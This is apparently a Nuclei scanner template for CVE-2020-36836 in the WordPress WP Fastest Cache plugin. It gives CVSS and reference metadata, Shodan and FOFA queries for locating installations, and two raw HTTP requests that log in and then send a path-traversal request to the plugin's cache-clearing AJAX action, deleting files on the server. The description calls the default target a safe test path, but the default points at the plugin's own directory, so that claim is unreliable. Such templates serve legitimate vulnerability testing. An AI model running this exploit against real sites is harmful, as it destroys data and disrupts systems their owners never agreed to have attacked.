id: CVE-2020-36836

info:
  name: WordPress WP Fastest Cache <= 0.9.0.2 - Authenticated Arbitrary File Deletion
  author: melmathari
  severity: high
  description: |
    The WP Fastest Cache plugin for WordPress up to version 0.9.0.2 contains a file deletion vulnerability caused by lack of capability checking and insufficient path validation. This allows authenticated users with minimal permissions (such as subscribers) to delete arbitrary files on the server by exploiting the wpfc_delete_current_page_cache AJAX action with path traversal payloads. Use -var target_path=<path> to specify target (default: safe test path).
  impact: |
    Successful exploitation allows authenticated attackers with minimal permissions to delete arbitrary files on the server, potentially leading to denial of service, data loss, or further system compromise.
  remediation: |
    Update WP Fastest Cache to version 0.9.0.3 or later to mitigate the vulnerability.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/ed6e699a-775e-4c59-a266-874eab5fa3a6
    - https://nvd.nist.gov/vuln/detail/CVE-2020-36836
    - https://plugins.trac.wordpress.org/changeset/2342347/wp-fastest-cache
    - https://wearetradecraft.com/advisories/tc-2020-0001/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2020-36836
    cwe-id: CWE-862
    epss-score: 0.00205
    epss-percentile: 0.43847
    cpe: cpe:2.3:a:wpfastestcache:wp_fastest_cache:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: wpfastestcache
    product: wp_fastest_cache
    framework: wordpress
    shodan-query: "http.html:/wp-content/plugins/wp-fastest-cache/"
    fofa-query: "body=/wp-content/plugins/wp-fastest-cache/"
    publicwww-query: "/wp-content/plugins/wp-fastest-cache/"
  tags: cve,cve2020,wordpress,wp-plugin,wp-fastest-cache,auth,file-deletion,wpfastestcache

flow: http(1) && http(2)

variables:
  target_path: "wp-content/plugins/wp-fastest-cache"

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 302'
          - 'contains(header, "wordpress_logged_in")'
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-ajax.php?path=/../../../{{target_path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=wpfc_delete_current_page_cache

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"The cache of page has been cleared"'
          - '"success"'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - '"success":true'
          - '"message":"The cache of page has been cleared"'
          - "The cache of page has been cleared"

# digest: 4b0a00483046022100d2c5e8f9a4b1c7e3f5a9b8d6c2e7f1a4b9c8d5e2f7a3b6c9d8e5f2a7b4c1e8f9022100a3b6c9d8e5f2a7b4c1e8f9d2c5e8f9a4b1c7e3f5a9b8d6c2e7f1a4b9c8d5e2f7:922c64590222798bb761d5b6d8e72950
